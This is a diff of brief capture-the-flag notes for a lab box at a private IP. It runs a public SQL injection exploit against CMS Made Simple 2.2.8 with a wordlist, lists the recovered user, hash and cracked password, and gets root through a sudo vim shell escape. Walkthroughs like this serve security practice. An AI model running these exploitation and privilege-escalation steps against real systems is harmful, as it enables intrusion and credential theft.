@@ -31,11 +31,21 @@ whatweb 10.10.9.154/simple/
 [+]EXPLOIT[+]
 CMS-Made-Simple[2.2.8]
 https://www.exploit-db.com/exploits/46635
-python 46635.py -u http://10.10.9.154/simple/
+python 46635.py -u http://10.10.9.154/simple/ -w /usr/share/rockyou.txt
 [+] Salt for password found: 1dac0d92e9fa6bb2
 [+] Username found: mitch
 [+] Email found: admin@admin.com
 [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Cracking Password: secret
+
+[+]Privilage escaltion[+]
+ssh mitch@ip -p2222
+user.txt
+sudo -l
+/usr/bin/vim
+sudo vim -c '!bash'
+root.txt
+
 
 
 
